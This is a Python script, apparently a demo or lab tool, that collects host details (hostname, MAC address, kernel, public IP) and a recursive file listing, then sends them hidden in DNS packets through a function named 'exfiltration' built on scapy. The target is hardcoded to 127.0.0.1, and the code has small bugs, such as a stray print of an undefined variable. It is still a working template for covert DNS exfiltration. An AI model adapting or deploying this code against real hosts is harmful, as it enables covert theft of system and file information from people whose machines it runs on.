#!/usr/bin/env python

# Libraries
from scapy.all import *
from uuid import getnode as get_mac
import socket
import urllib.request as urllib2
from json import load
try:
    from os import scandir
except ImportError:
    from scandir import scandir

# ==========================================================================================

# System informations
opesys = os.uname()

system = opesys[0]
user = opesys[1]
distrib = opesys[2]
# get public ip address
my_ip = load(urllib2.urlopen('http://jsonip.com'))['ip']
# Mac address
macaddr = hex(get_mac())

IP_h = "127.0.0.1"

test = [user,macaddr,system,distrib,my_ip]

# ===========================================================================================
# Functions

def validateIP(s):
	# Test ip
	address=s.split('.')
	if len(address)!=4:
		return False
	for x in address:
		if not x.isdigit():
			return False
		i=int(x)
		if i<0 or i>255:
			return False
	return True

def exfiltration(data):
    # Data exfiltration
	send (IP(dst="127.0.0.1") / UDP() / DNS(qd=DNSQR(
    qname="localhost", qtype="A"))/data)
	print(i)
 
def scantree(path):
    """Recursively yield DirEntry objects for given directory."""
    for entry in scandir(path):
        if entry.is_dir(follow_symlinks=False):
            yield from scantree(entry.path)
        else:
            yield entry


if validateIP(IP_h):
	# DNS exfiltration
	for i in test:
		exfiltration(i)
		print(i)
	scantree(".")

else:
    print("Bad ip")

if __name__ == '__main__':
    import sys
    
    tree = ""
    for entry in scantree(sys.argv[1] if len(sys.argv) > 1 else '.'):
        tree += str(entry.path) + "\n"
        
    exfiltration(tree)
    print(tree)